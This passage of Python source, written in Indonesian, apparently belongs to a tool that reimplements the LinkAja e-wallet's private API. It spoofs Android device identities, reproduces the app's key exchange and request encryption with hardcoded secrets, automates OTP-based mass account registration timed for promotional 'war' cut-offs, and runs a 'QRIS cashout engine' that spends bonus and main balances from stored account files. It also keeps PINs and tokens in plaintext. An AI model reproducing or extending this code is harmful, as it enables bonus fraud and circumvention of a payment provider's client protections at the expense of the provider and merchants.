        f"Koneksi timeout ({type(last_err).__name__}) ke {url} setelah {max_retries}x percobaan"
    ) from last_err


def prime_connection() -> float:
    """Priming/warm-up socket TCP dan TLS session ke LinkAja API menggunakan request OPTIONS ringan."""
    try:
        t0 = time.perf_counter()
        _CLIENT.options(f"{BASE}/onboard/check")
        return (time.perf_counter() - t0) * 1000
    except Exception:
        return -1.0


def prime_connection_pool(concurrency: int = 10) -> int:
    """Membuka N soket TCP/TLS secara serentak di connection pool (timeout ketat non-blocking)."""
    import concurrent.futures
    count = 0
    def _warm():
        nonlocal count
        try:
            _CLIENT.options(f"{BASE}/onboard/check", timeout=1.5)
            count += 1
        except Exception:
            pass
    try:
        workers = min(max(concurrency, 1), 50)
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            futures = [ex.submit(_warm) for _ in range(workers)]
            concurrent.futures.wait(futures, timeout=2.0)
        return count
    except Exception:
        return 0


def state_path(msisdn) -> pathlib.Path:
    return STATES / f"state_{msisdn}.json"


def save_state(msisdn, sess, refid=None, jwt=None, refreshToken=None):
    """Simpan/perbarui state akun (identity + session keys + refId + JWT)."""
    ident, shared = sess
    p = state_path(msisdn)
    old = {}
    if p.exists():
        try:
            old = json.loads(p.read_text())
            if not isinstance(old, dict):
                old = {}
        except Exception:
            old = {}
    old.update({"ident": ident, "shared": shared, "created": time.time()})
    if refid:
        old["refId"] = refid
    if jwt:
        old["jwt"] = jwt
    if refreshToken:
        old["refreshToken"] = refreshToken
    p.write_text(json.dumps(old, ensure_ascii=False, indent=2))
    return old


def save_full_account_state(msisdn, sess, jwt, refreshToken, fullname, email, pin, customerId):
    """Simpan seluruh metadata akun dalam 1x I/O disk."""
    ident, shared = sess
    p = state_path(msisdn)
    old = {}
    if p.exists():
        try:
            old = json.loads(p.read_text())
            if not isinstance(old, dict):
                old = {}
        except Exception:
            old = {}
    old.update({
        "ident": ident,
        "shared": shared,
        "created": time.time(),
        "jwt": jwt,
        "refreshToken": refreshToken,
        "fullname": fullname,
        "email": email,
        "pin": pin,
        "customerId": customerId,
        "msisdn": msisdn
    })
    p.write_text(json.dumps(old, ensure_ascii=False, indent=2))
    return old


def defer_save_account(msisdn, sess, jwt, refreshToken, fullname, email, pin, customerId):
    """Penyimpanan state akun di background thread (non-blocking)."""
    import threading
    t = threading.Thread(
        target=save_full_account_state,
        args=(msisdn, sess, jwt, refreshToken, fullname, email, pin, customerId),
        daemon=False
    )
    t.start()
    return t


def load_state(msisdn, max_age=7 * 86400) -> dict | None:
    p = state_path(msisdn)
    if p.exists():
        try:
            st = json.loads(p.read_text())
        except Exception:
            return None
        if time.time() - st.get("created", 0) > max_age:
            return None
        return st
    return None


def list_states() -> list[dict]:
    out = []
    for p in sorted(STATES.glob("state_*.json")):
        try:
            st = json.loads(p.read_text())
            ms = p.stem.replace("state_", "")
            out.append({"msisdn": ms, "fullname": st.get("fullname", ""),
                        "jwt": st.get("jwt", ""),
                        "file": str(p)})
        except Exception:
            pass
    return out


def key_agreement(max_retries: int = 3):
    for attempt in range(1, max_retries + 1):
        ident = new_identity()
        did, imsi = ident["deviceId"], ident["imsi"]
        fid_tok = ident.get("fid_token") or FID_TOKEN
        dmodel = ident.get("devicemodel") or "XIAOMI Redmi Note 5"
        osver = ident.get("osversion") or "13"
        osnm = ident.get("osname") or "Android"
        priv = dh_privkeys()
        pub = get_public_key(priv)
        payload = json.dumps({"Krisna": pub["key1"], "Endhy": pub["key2"],
                              "Rilvi": pub["key3"]}, separators=(',', ':'))
        ts = str(int(time.time() * 1000))
        enc = lambda m: df.encrypt_body(ts, did, imsi, m, k3="", gk=df.GK_FALLBACK)
        send = json.dumps({"putu": enc(payload), "tayo": enc(payload + df.SECRET),
                           "thomas": enc("7744" + payload + ts)}, separators=(',', ':'))
        raw = df.calc_raw(ts, did, imsi, send + ts + df.UID_MAC, k1="", gk=df.GK_FALLBACK)
        H = {"accept-language": "ID", "pushid": "", "jid": ident["jid"],
             "adsid": ident["adsId"], "longitude": "-1.0", "latitude": "-1.0",
             "fid": fid_tok, "osname": osnm, "osversion": osver,
             "appversion": VER, "devicemodel": dmodel,
             "accept": "application/json", "deviceid": did, "imsi": imsi,
             "content-type": "application/json; charset=UTF-8",
             "timestamp": ts, "raw": raw, "errorcode": "",
             "authorization": "Bearer", "user-agent": "okhttp/4.11.0",
             "accept-encoding": "gzip"}
        try:
            r = robust_request("POST", f"{BASE}/echo", content=send, headers=H, max_retries=2)
            assert r.status_code == 200, f"echo {r.status_code}: {r.text[:120]}"
            resp = json.loads(r.text)
            shared = {"key1": generate_shared_key(priv["key1"], resp["data"]["x1"]),
                      "key2": generate_shared_key(priv["key2"], resp["data"]["x2"]),
                      "key3": generate_shared_key(priv["key3"], resp["data"]["x3"])}
            return ident, shared
        except Exception as exc:
            if attempt < max_retries:
                time.sleep(0.5 * attempt)
                continue
            raise SessionTimeoutError(f"Key agreement /echo gagal setelah {max_retries}x percobaan: {exc}") from exc


def decrypt_resp(r, st):
    """Response decrypt: gk=getKey(k1), ts = response header timestamp."""
    import base64
    from Crypto.Cipher import AES
    body = r.text.strip()
    if body.startswith("{"):
        return json.loads(body)
    ident, shared = st["ident"], st["shared"]
    did, imsi = ident["deviceId"], ident["imsi"]
    rts = r.headers.get("timestamp", "")
    gk = df.get_key(shared["key1"], VER)
    _xr = lambda d, k: bytes(d[i] ^ k[i % len(k)] for i in range(len(d)))
    _mask = lambda b: bytes(((x & 0x3f) << 2) & 0xff for x in b)
    se2 = _xr(imsi.encode() + gk.encode(), (did + rts).encode())
    key32 = _mask(se2)
    se3 = _xr(rts.encode(), gk.encode())
    iv = (_mask(se3) + b"\x00" * 16)[:16]
    pt = AES.new(key32, AES.MODE_CBC, iv).decrypt(base64.b64decode(body))
    n = pt[-1] if pt[-1] <= 16 else 0
    return json.loads(pt[:len(pt) - n].decode())


def api_post(sess, path, payload_dict, token="Bearer", ts=None, extra_headers=None, max_retries=3):
    ident, shared = sess
    did, imsi = ident["deviceId"], ident["imsi"]
    fid_tok = ident.get("fid_token") or FID_TOKEN
    dmodel = ident.get("devicemodel") or "XIAOMI Redmi Note 5"
    osver = ident.get("osversion") or "13"
    osnm = ident.get("osname") or "Android"
    payload = json.dumps(payload_dict, separators=(',', ':'))
    ts = ts or str(int(time.time() * 1000))
    enc = lambda m: df.encrypt_body(ts, did, imsi, m, k3=shared["key3"])
    send = json.dumps({"putu": enc(payload), "tayo": enc(payload + df.SECRET),
                       "thomas": enc("7744" + payload + ts)}, separators=(',', ':'))
    raw = df.calc_raw(ts, did, imsi, send + ts + df.UID_MAC, k1=shared["key1"])
    H = {"accept-language": "ID", "pushid": "", "jid": ident["jid"],
         "adsid": ident["adsId"], "longitude": "-1.0", "latitude": "-1.0",
         "fid": fid_tok, "osname": osnm, "osversion": osver,
         "appversion": VER, "devicemodel": dmodel,
         "accept": "application/json", "deviceid": did, "imsi": imsi,
         "content-type": "application/json; charset=UTF-8",
         "timestamp": ts, "raw": raw, "errorcode": "",
         "authorization": token, "user-agent": "okhttp/4.11.0",
         "accept-encoding": "gzip"}
    if extra_headers:
        H.update(extra_headers)
    return robust_request("POST", BASE + path, content=send, headers=H, max_retries=max_retries)


def api_get(sess, path, token="Bearer", max_retries=3):
    ident, shared = sess
    did, imsi = ident["deviceId"], ident["imsi"]
    fid_tok = ident.get("fid_token") or FID_TOKEN
    dmodel = ident.get("devicemodel") or "XIAOMI Redmi Note 5"
    osver = ident.get("osversion") or "13"
    osnm = ident.get("osname") or "Android"
    ts = str(int(time.time() * 1000))
    raw = df.calc_raw(ts, did, imsi, ts + df.UID_MAC, k1=shared["key1"])
    H = {"accept-language": "ID", "pushid": "", "jid": ident["jid"],
         "adsid": ident["adsId"], "longitude": "-1.0", "latitude": "-1.0",
         "fid": fid_tok, "osname": osnm, "osversion": osver,
         "appversion": VER, "devicemodel": dmodel,
         "accept": "application/json", "deviceid": did, "imsi": imsi,
         "timestamp": ts, "raw": raw, "errorcode": "",
         "authorization": token, "user-agent": "okhttp/4.11.0",
         "accept-encoding": "gzip"}
    return robust_request("GET", BASE + path, headers=H, max_retries=max_retries)


class session:
    VER = VER
    BASE = BASE
    FID_TOKEN = FID_TOKEN
    DATA = DATA
    STATES = STATES
    _CLIENT = _CLIENT
    prime_connection = staticmethod(prime_connection)
    prime_connection_pool = staticmethod(prime_connection_pool)
    state_path = staticmethod(state_path)
    save_state = staticmethod(save_state)
    save_full_account_state = staticmethod(save_full_account_state)
    defer_save_account = staticmethod(defer_save_account)
    load_state = staticmethod(load_state)
    list_states = staticmethod(list_states)
    key_agreement = staticmethod(key_agreement)
    decrypt_resp = staticmethod(decrypt_resp)
    robust_request = staticmethod(robust_request)
    api_post = staticmethod(api_post)
    api_get = staticmethod(api_get)
    SessionError = SessionError
    SessionTimeoutError = SessionTimeoutError



# ============================================================
# MODUL INTEGRASI 6: REGISTRATION ENGINE
# ============================================================

"""regis.py — flow pendaftaran akun LinkAja (input manual, OTP via SMS).

Tahap:
  1. onboard/check → cek nomor
  2. /otp (onboarding) → SMS OTP ke nomor user; refId disimpan
  3. validate-check (OTP dari user)
  4. register (nama + email + PIN) — harus ≤60 dtk setelah validate
  5. state disimpan (identity + session keys + JWT)
"""









TNC = "17 Februari 2025"
ENC_KEY = "DN$F#hwNk7TJWhu+ptF#f8bNTCASH"


class RegisError(Exception):
    """Error user-friendly (message-nya langsung bisa ditampilkan)."""


def normalize_msisdn(raw: str) -> str:
    """62812xxxx / 0812xxxx / +62812xxxx → 62812xxxx."""
    m = (raw or "").strip().lstrip("+").replace(" ", "").replace("-", "")
    if m.startswith("0"):
        m = "62" + m[1:]
    if not (m.startswith("62") and m[8:].isdigit() and 10 <= len(m) <= 15):
        raise RegisError("Nomor HP gak valid. Contoh: 08123456789")
    return m


def step_check(msisdn):
    """Cek nomor di server. Return (sudah_terdaftar: bool, pesan)."""
    st = load_state(msisdn, max_age=365 * 86400)
    if not st:
        st = _new_state(msisdn)
    try:
        r = api_post(_sess(st), "/onboard/check", {"msisdn": msisdn})
    except (SessionTimeoutError, httpx.TimeoutException, httpx.RequestError) as exc:
        raise RegisError(f"Timeout cek nomor: server tidak merespons ({exc})") from exc
    j = decrypt_resp(r, st) if r.status_code == 200 else {}
    status = j.get("status", "")
    msg = j.get("message", "")
    low = (msg or "").lower()
    # 10010004: "Nomor Anda sudah terdaftar" -> tolak
    # 10010005: "Anda belum terdaftar" -> fresh
    # 10010019: "Nomor HP tidak dapat digunakan" (belum terdaftar di auth flow) -> fresh
    already_registered = (status == "10010004" or ("terdaftar" in low and "belum" not in low))
    return already_registered, f"{status} | {msg}"


def step_send_otp(msisdn, sess=None):
    """Kirim SMS OTP ke nomor user. Return refId (disimpan di state)."""
    st = load_state(msisdn, max_age=365 * 86400)
    try:
        if sess is None:
            sess = key_agreement()          # OTP selalu session fresh
        st = _ensure_state(msisdn, sess)
        r = api_post(sess, "/onboard/check", {"msisdn": msisdn})
        r = api_post(sess, "/otp", {"msisdn": msisdn, "type": "onboarding"})
    except (SessionTimeoutError, httpx.TimeoutException, httpx.RequestError) as exc:
        raise RegisError(f"Timeout kirim OTP: server tidak merespons ({exc})") from exc
    if r.status_code != 200:
        raise RegisError(f"Server nolak kirim OTP (HTTP {r.status_code})")
    j = decrypt_resp(r, _st_of(sess))
    refid = j.get("refId") or j.get("data", {}).get("refId")
    if not refid:
        raise RegisError("Server gak kasih refId — coba lagi")
    save_state(msisdn, sess, refid=refid)
    return refid


def step_validate(msisdn, otp: str) -> dict:
    """Validasi OTP user → state SIGNUP. Raise RegisError kalau salah."""
    otp_clean = "".join(filter(str.isdigit, str(otp)))
    if len(otp_clean) == 6:
        otp = otp_clean
    st = load_state(msisdn, max_age=365 * 86400)
    if not st or not st.get("refId"):
        raise RegisError("Ga ada sesi OTP aktif — mulai daftar lagi")
    try:
        r = api_post(_sess(st), "/onboard/validate-check",
                     {"msisdn": msisdn, "otp": otp, "refId": st["refId"]})
    except (SessionTimeoutError, httpx.TimeoutException, httpx.RequestError) as exc:
        raise RegisError(f"Timeout validasi OTP: server tidak merespons ({exc})") from exc
    j = decrypt_resp(r, st) if r.status_code == 200 else {}
    d = j.get("data", {}) if isinstance(j.get("data"), dict) else {}
    state = d.get("state", "")
    if state != "SIGNUP":
        if state == "LOGIN":
            raise RegisError("Nomor Daur Ulang (Akun Lama Terdaftar)")
        raise RegisError(f"OTP ditolak: status={j.get('status')}, state={state or '-'}")
    return j


class PrebuiltRegisterPayload:
    """Kontainer paket pendaftaran yang sudah di-pre-build (terenkripsi penuh) di memory."""
    def __init__(self, msisdn, sess, st, url, content, headers, fullname, email, pin, ts):
        self.msisdn = msisdn
        self.sess = sess
        self.st = st
        self.url = url
        self.content = content
        self.headers = headers
        self.fullname = fullname
        self.email = email
        self.pin = pin
        self.ts = ts


def prepare_register_payload(msisdn, pin, fullname, email, target_ts=None, st=None) -> PrebuiltRegisterPayload:
    """Pre-compute & build seluruh payload pendaftaran sebelum jam cut-off.
    
    Menyelesaikan seluruh hashing (SHA-256), enkripsi PIN, 3x AES Body,
    dan HMAC-SHA512 di memory sebelum trigger pengiriman.
    """
    if st is None:
        st = load_state(msisdn, max_age=365 * 86400)
    if not st or not st.get("refId"):
        raise RegisError("Ga ada sesi validate aktif — mulai daftar lagi")
    
    sess = _sess(st)
    ident, shared = sess
    did, imsi = ident["deviceId"], ident["imsi"]
    
    ts = str(int(target_ts)) if target_ts else str(int(time.time() * 1000))
    key32 = hashlib.sha256(ENC_KEY.encode()).hexdigest()[:32]
    pin_enc = pin_crypto.encrypt_plain_text(pin, key32, ts)
    
    body = {
        "email": email, "fullName": fullname, "msisdn": msisdn,
        "pushId": "", "pin": pin_enc, "sharia": False, "tncVersion": TNC
    }
    payload_json = json.dumps(body, separators=(',', ':'))
    
    # Pre-cache deterministik get_key agar tidak dihitung ulang berkali-kali
    gk_k3 = df.get_key(shared["key3"], VER)
    gk_k1 = df.get_key(shared["key1"], VER)
    
    enc = lambda m: df.encrypt_body(ts, did, imsi, m, k3=shared["key3"], ver=VER, gk=gk_k3)
    send = json.dumps({
        "putu": enc(payload_json),
        "tayo": enc(payload_json + df.SECRET),
        "thomas": enc("7744" + payload_json + ts)
    }, separators=(',', ':'))
    
    raw = df.calc_raw(ts, did, imsi, send + ts + df.UID_MAC, k1=shared["key1"], ver=VER, gk=gk_k1)
    
    fid_tok = ident.get("fid_token") or FID_TOKEN
    dmodel = ident.get("devicemodel") or "XIAOMI Redmi Note 5"
    osver = ident.get("osversion") or "13"
    osnm = ident.get("osname") or "Android"

    headers = {
        "accept-language": "ID", "pushid": "", "jid": ident["jid"],
        "adsid": ident["adsId"], "longitude": "-1.0", "latitude": "-1.0",
        "fid": fid_tok, "osname": osnm, "osversion": osver,
        "appversion": VER, "devicemodel": dmodel,
        "accept": "application/json", "deviceid": did, "imsi": imsi,
        "content-type": "application/json; charset=UTF-8",
        "timestamp": ts, "raw": raw, "errorcode": "",
        "authorization": "Bearer", "user-agent": "okhttp/4.11.0",
        "accept-encoding": "gzip",
        "x-koya-geheim": ts
    }
    url = f"{BASE}/onboard/register"
    
    return PrebuiltRegisterPayload(
        msisdn=msisdn,
        sess=sess,
        st=st,
        url=url,
        content=send,
        headers=headers,
        fullname=fullname,
        email=email,
        pin=pin,
        ts=ts
    )


def execute_register_payload(prebuilt: PrebuiltRegisterPayload, async_save=True, timeout=30.0) -> tuple[dict, float]:
    """Menembak request pendaftaran pre-built secara instan (0 overhead enkripsi/persiapan).
    
    Returns: (data_dict, latency_network_ms)
    """
    t0 = time.perf_counter()
    try:
        # Gunakan timeout 10.0s agar tidak terputus saat server LinkAja antre antrean war
        r = _CLIENT.post(prebuilt.url, content=prebuilt.content, headers=prebuilt.headers, timeout=timeout)
    except (httpx.TimeoutException, httpx.RequestError) as exc:
        raise RegisError(f"Register timeout / koneksi terputus: {exc}") from exc
    rtt_ms = (time.perf_counter() - t0) * 1000
    
    j = decrypt_resp(r, prebuilt.st) if r.status_code == 200 else {}
    if j.get("status") not in ("00", "10010201"):
        raise RegisError(f"Register gagal: {j.get('message') or j.get('status')}")
    
    d = j.get("data", {})
    jwt = d.get("auth")
    refresh_token = d.get("refreshToken")
    customer_id = d.get("customerId")
    
    if async_save:
        defer_save_account(
            prebuilt.msisdn, prebuilt.sess, jwt, refresh_token,
            prebuilt.fullname, prebuilt.email, prebuilt.pin, customer_id
        )
    else:
        save_full_account_state(
            prebuilt.msisdn, prebuilt.sess, jwt, refresh_token,
            prebuilt.fullname, prebuilt.email, prebuilt.pin, customer_id
        )
        
    return d, rtt_ms


def step_register(msisdn, pin, fullname, email) -> dict:
    """Setor nama+email+PIN → akun jadi. Wajib ≤60 dtk setelah validate."""
    prebuilt = prepare_register_payload(msisdn, pin, fullname, email)
    d, _ = execute_register_payload(prebuilt, async_save=True)
    return d


# ── helpers ──────────────────────────────────────────────────────────────
def _sess(st):
    return (st["ident"], st["shared"])


def _st_of(sess):
    return {"ident": sess[0], "shared": sess[1]}


def _new_state(msisdn):
    sess = key_agreement()
    save_state(msisdn, sess)
    return load_state(msisdn, max_age=365 * 86400)


def _ensure_state(msisdn, sess):
    save_state(msisdn, sess)
    return _st_of(sess)


class regis:
    TNC = TNC
    ENC_KEY = ENC_KEY
    RegisError = RegisError
    normalize_msisdn = staticmethod(normalize_msisdn)
    step_check = staticmethod(step_check)
    step_send_otp = staticmethod(step_send_otp)
    step_validate = staticmethod(step_validate)
    PrebuiltRegisterPayload = PrebuiltRegisterPayload
    prepare_register_payload = staticmethod(prepare_register_payload)
    execute_register_payload = staticmethod(execute_register_payload)
    step_register = staticmethod(step_register)



# ============================================================
# MODUL INTEGRASI 7: QRIS CASHOUT ENGINE
# ============================================================

#!/usr/bin/env python3
"""core/qris.py — Modul Payment & Cashout QRIS Dinamis/Statis LinkAja.

Mendukung pembayaran menggunakan saldo bonus (bonbal), saldo utama, maupun
penggabungan keduanya (split-payment).
"""










# VER already defined in session
# BASE already defined in session
# ENC_KEY already defined in regis


# -------------------------------------------------------------
# 1. EMV TLV PARSER & OFFLINE QR INSPECTION (ZERO-DEPENDENCY)
# -------------------------------------------------------------
def _crc16(data: str) -> int:
    crc = 0xFFFF
    for ch in data.encode("utf-8"):
        crc ^= ch << 8
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1021) & 0xFFFF if crc & 0x8000 else (crc << 1) & 0xFFFF
    return crc


def emv_fields(raw: str) -> dict:
    """Parse EMV TLV sequential dari awal string QR."""
    out, i = {}, 0
    while i + 4 <= len(raw):
        try:
            tag, ln = raw[i:i + 2], int(raw[i + 2:i + 4])
        except ValueError:
            break
        val = raw[i + 4:i + 4 + ln]
        if len(val) < ln:
            break
        out.setdefault(tag, val)
        i += 4 + ln
    return out


def inspect_qr(raw: str) -> dict:
    """Inspeksi offline format QRIS: validitas CRC, tipe dinamis/statis, merchant, dan nominal."""
    raw = (raw or "").strip()
    info = {"raw_len": len(raw), "ok": False}
    if len(raw) < 20 or not raw.startswith("00"):
        info["err"] = "Bukan format QRIS yang valid (Tag 00 tidak ditemukan)"
        return info

    crc_tag, body = raw[-4:], raw[:-4]
    info["crc_ok"] = f"{_crc16(body):04X}".upper() == crc_tag.upper()
    f = emv_fields(raw)
    info["fields"] = f
    info["merchant"] = (f.get("59") or f.get("58") or "Merchant").strip()
    info["mcc"] = f.get("52")
    info["currency"] = f.get("53")
    info["poi_method"] = f.get("01")  # 02 = statis, 12 = dinamis
    info["reference"] = f.get("62") or ""

    amt54 = f.get("54")
    if amt54:
        try:
            info["amount_tag54"] = float(int(amt54))
        except ValueError:
            info["amount_tag54"] = None
    else:
        info["amount_tag54"] = None

    info["dynamic"] = bool(amt54)
    info["ok"] = info["crc_ok"] and bool(f.get("26"))
    return info


# -------------------------------------------------------------
# 2. SOF (SOURCE OF FUNDS) DECRYPTION (AES KEY2)
# -------------------------------------------------------------
def bonbal_pm(inq_data: dict, sess: tuple, rts: str) -> dict | None:
    """Mendekripsi Source of Funds (SOF) LinkAja menggunakan Key2."""
    ident, shared = sess
    did, imsi = ident["deviceId"], ident["imsi"]
    sof = None
    for sec in (inq_data.get("detail") or []):
        if sec.get("id") == 3:
            for it in (sec.get("data") or []):
                if (it.get("themes") or {}).get("style") == ["ENCRYPTED"]:
                    sof = it.get("value")
                    break
    if not sof:
        return None

    k2 = shared.get("key2", "")
    if len(k2) < 16:
        return None

    try:
        blob = base64.b64decode(sof)
    except Exception:
        return None

    if not blob or len(blob) % 16:
        return None

    n = len(k2)
    gks = [df.get_key(k2, VER)]
    gks += ["".join(k2[(off + i) % n] for i in range(16)) for off in range(n)]

    _xr = lambda d, k: bytes(d[i] ^ k[i % len(k)] for i in range(len(d)))
    _mask = lambda b: bytes(((x & 0x3f) << 2) & 0xff for x in b)

    for gk in gks:
        if not gk:
            continue
        key32 = _mask(_xr(imsi.encode() + gk.encode(), (did + rts).encode()))
        iv = (_mask(_xr(rts.encode(), gk.encode())) + b"\x00" * 16)[:16]
        try:
            first = AES.new(key32, AES.MODE_CBC, iv).decrypt(blob[:16])
        except Exception:
            continue
        if first[:1] not in (b"{", b"["):
            continue
        pt = AES.new(key32, AES.MODE_CBC, iv).decrypt(blob)
        pad = pt[-1] if pt[-1] <= 16 else 0
        try:
            pms = json.loads(pt[:len(pt) - pad].decode())
        except Exception:
            continue

        pms_list = pms if isinstance(pms, list) else [pms]
        # Prioritas 1: Split payment yang ENABLED
        for pm in pms_list:
            if isinstance(pm, dict) and pm.get("isBonbal") and pm.get("isEnable", True):
                return pm

        # Prioritas 2: Reguler LinkAja yang ENABLED (code 09110)
        for pm in pms_list:
            if isinstance(pm, dict) and pm.get("code") == "09110" and pm.get("isEnable", True):
                return pm

        # Prioritas 3: Fallback sembarang isBonbal
        for pm in pms_list:
            if isinstance(pm, dict) and pm.get("isBonbal"):
                return pm

        # Prioritas 4: Fallback sembarang code 09110
        for pm in pms_list:
            if isinstance(pm, dict) and pm.get("code") == "09110":
                return pm
    return None


# -------------------------------------------------------------
# 3. QRIS API PIPELINE
# -------------------------------------------------------------
def qr_parse(sess: tuple, msisdn: str, raw_qr: str, jwt: str) -> dict | None:
    """POST /transaction/qr/parse."""
    ts = str(int(time.time() * 1000))
    extra = {"x-koya-geheim": ts}
    payload = {"input": raw_qr, "msisdn": msisdn}
    token = f"Bearer {jwt}"
    r = session.api_post(sess, "/transaction/qr/parse", payload, token=token, ts=ts, extra_headers=extra)
    if r.status_code != 200:
        return None
    st = {"ident": sess[0], "shared": sess[1]}
    j = session.decrypt_resp(r, st)
    if j.get("status") != "00":
        return None
    return j.get("data", {})


def qr_inquiry(sess: tuple, msisdn: str, parse_id: str, amount: float, jwt: str) -> tuple[dict | None, str, str]:
    """POST /transaction/qr/inquiry. Return (inq_data, rts, err_msg)."""
    ts = str(int(time.time() * 1000))
    extra = {"x-koya-geheim": ts}
    payload = {
        "origin": msisdn,
        "parseId": parse_id,
        "tipId": None,
        "amount": float(amount),
        "isUseBonbal": True,
        "promoCodes": []
    }
    token = f"Bearer {jwt}"
    r = session.api_post(sess, "/transaction/qr/inquiry", payload, token=token, ts=ts, extra_headers=extra)
    rts = r.headers.get("timestamp", "")
    if r.status_code != 200:
        return None, rts, f"HTTP Error {r.status_code}"
    st = {"ident": sess[0], "shared": sess[1]}
    j = session.decrypt_resp(r, st)
    if j.get("status") != "00":
        return None, rts, f"{j.get('status')} | {j.get('message', 'Inquiry ditolak')}"
    return j.get("data", {}), rts, ""


def qr_confirm(sess: tuple, msisdn: str, trx_id: str, pin: str, pm: dict, jwt: str) -> dict | None:
    """POST /transaction/qr/confirm dengan PIN terenkripsi."""
    ts = str(int(time.time() * 1000))
    key32 = hashlib.sha256(ENC_KEY.encode()).hexdigest()[:32]
    pin_enc = pin_crypto.encrypt_plain_text(pin, key32, ts)
    payload = {
        "transactionId": trx_id,
        "code": pm.get("code", "09110"),
        "bankCode": pm.get("bankCode", "09110"),
        "cardId": pm.get("cardId", msisdn),
        "sid": pm.get("sid", msisdn),
        "pin": pin_enc
    }
    extra = {"x-koya-geheim": ts}
    token = f"Bearer {jwt}"
    r = session.api_post(sess, "/transaction/qr/confirm", payload, token=token, ts=ts, extra_headers=extra)
    if r.status_code != 200:
        return None
    st = {"ident": sess[0], "shared": sess[1]}
    j = session.decrypt_resp(r, st)
    status_code = j.get("status")
    if status_code in ("00", "60010011"):
        return {
            "success": True,
            "status": status_code,
            "pending": (status_code == "60010011"),
            "message": j.get("message", "Sukses"),
            "data": j.get("data", {})
        }
    return {
        "success": False,
        "status": status_code,
        "message": j.get("message", "Konfirmasi ditolak"),
        "data": j.get("data", {})
    }


# -------------------------------------------------------------
# 4. HIGH-LEVEL EXECUTOR PER AKUN
# -------------------------------------------------------------
def check_account_balance(sess: tuple, jwt: str, st: dict) -> tuple[int, int]:
    """Cek Saldo Utama dan Saldo Bonus secara live langsung dari server LinkAja."""
    token = f"Bearer {jwt}"
    saldo_utama = 0
    bonus_poin = 0
    try:
        r_bal = session.api_get(sess, "/user/balance", token=token)
        if r_bal.status_code == 200:
            d_bal = session.decrypt_resp(r_bal, st)
            raw_v = (d_bal.get("data") or {}).get("value", 0)
            saldo_utama = int("".join(filter(str.isdigit, str(raw_v))) or 0)
    except Exception:
        pass

    try:
        r_pt = session.api_get(sess, "/user/point", token=token)
        if r_pt.status_code == 200:
            d_pt = session.decrypt_resp(r_pt, st)
            raw_p = (d_pt.get("data") or {}).get("total", 0)
            bonus_poin = int("".join(filter(str.isdigit, str(raw_p))) or 0)
    except Exception:
        pass

    return saldo_utama, bonus_poin


def pay_account_qris(state_file_path: str, raw_qr: str, pin_fallback: str = "888999", custom_amount: float = None) -> tuple[bool, str, dict]:
    """Eksekusi pembayaran QRIS untuk 1 file state akun.
    
    Mendukung penggabungan Saldo Bonus + Saldo Utama secara otomatis.
    Returns: (is_success: bool, status_msg: str, detail_dict: dict)
    """
    try:
        with open(state_file_path, "r") as f:
            st = json.load(f)
    except Exception as e:
        return False, f"Gagal membaca file state: {e}", {}

    msisdn = st.get("msisdn")
    jwt = st.get("jwt")
    rt = st.get("refreshToken")
    pin = st.get("pin") or pin_fallback

    if not msisdn or not jwt:
        return False, "Data akun tidak lengkap (msisdn atau jwt tidak ada)", {}

    sess = (st["ident"], st["shared"])

    # 1. Inspeksi format lokal
    inspect = inspect_qr(raw_qr)
    if not inspect["ok"]:
        return False, f"Format QRIS tidak valid ({inspect.get('err', 'CRC Error')})", {}

    # 2. Parse ke server LinkAja (auto refresh jika token expired)
    parse_data = qr_parse(sess, msisdn, raw_qr, jwt)
    if not parse_data and rt:
        # Coba auto-refresh token
        res_ref = session.api_post(sess, "/auth/session/refresh", {"token": jwt, "refreshToken": rt})
        if res_ref.status_code == 200:
            d_ref = session.decrypt_resp(res_ref, st)
            if d_ref.get("status") == "00":
                jwt = d_ref["data"]["token"]
                rt = d_ref["data"].get("refreshToken", rt)
                st["jwt"] = jwt
                st["refreshToken"] = rt
                with open(state_file_path, "w") as f:
                    json.dump(st, f, indent=2, ensure_ascii=False)
                parse_data = qr_parse(sess, msisdn, raw_qr, jwt)

    if not parse_data or not parse_data.get("parseId"):
        return False, "Parse QRIS ke server LinkAja gagal (QR kadaluarsa atau tidak aktif)", {}

    parse_id = parse_data["parseId"]
    merchant_name = parse_data.get("merchantName") or inspect.get("merchant") or "Merchant"
    srv_amount = parse_data.get("amount")

    # Nominal yang akan dibayar: custom > server parse > tag54
    nominal = custom_amount or srv_amount or inspect.get("amount_tag54")
    if not nominal or nominal <= 0:
        return False, "Nominal transaksi tidak terdeteksi (Gunakan QR Dinamis yang ber-nominal)", {}

    nominal = float(nominal)

    # 3. Inquiry Transaksi (isUseBonbal: True)
    inq_data, rts, err = qr_inquiry(sess, msisdn, parse_id, nominal, jwt)
    if not inq_data:
        return False, f"Inquiry gagal: {err}", {"merchant": merchant_name, "nominal": nominal}

    trx_id = inq_data.get("transactionId")
    if not trx_id:
        return False, "Tidak mendapatkan transactionId dari server", {}

    # 4. Dekripsi Source of Funds (SOF)
    pm = bonbal_pm(inq_data, sess, rts)
    if not pm:
        return False, "Gagal mendekripsi metode pembayaran / SOF akun", {}

    # Validasi gabungan Saldo Bonus + Saldo Utama (LinkAja menyimpan saldo utama di 'limitAmount')
    bonbal = float(pm.get("bonbal") or 0)
    balance = float(pm.get("limitAmount") or pm.get("balance") or 0)
    total_daya_beli = bonbal + balance

    if total_daya_beli < nominal:
        return False, (
            f"Saldo tidak cukup (Butuh: Rp {int(nominal):,} | "
            f"Tersedia: Rp {int(total_daya_beli):,} [Bonus: Rp {int(bonbal):,} + Utama: Rp {int(balance):,}])"
        ), {"merchant": merchant_name, "nominal": nominal, "bonbal": bonbal, "balance": balance}

    # 5. Konfirmasi Pembayaran
    conf = qr_confirm(sess, msisdn, trx_id, pin, pm, jwt)
    if not conf or not conf.get("success"):
        msg = conf.get("message", "Konfirmasi ditolak server") if conf else "Gagal konfirmasi pembayaran"
        return False, msg, {"merchant": merchant_name, "nominal": nominal}

    # 6. Verifikasi Saldo Real-Time (Anti-Transaksi Gantung di Switch LinkAja)
    expected_bonbal_used = min(bonbal, nominal)
    expected_balance_used = max(0.0, nominal - bonbal)

    # Jeda 1.5 detik agar database core LinkAja & switch merampungkan pencatatan ledger
    time.sleep(1.5)
    saldo_after, bonus_after = check_account_balance(sess, jwt, st)

    # Jika saldo utama seharusnya berkurang tapi masih utuh, polling verifikasi hingga 2 kali lagi
    if expected_balance_used > 0 and saldo_after >= balance:
        for _ in range(2):
            time.sleep(1.5)
            saldo_after, bonus_after = check_account_balance(sess, jwt, st)
            if saldo_after < balance:
                break

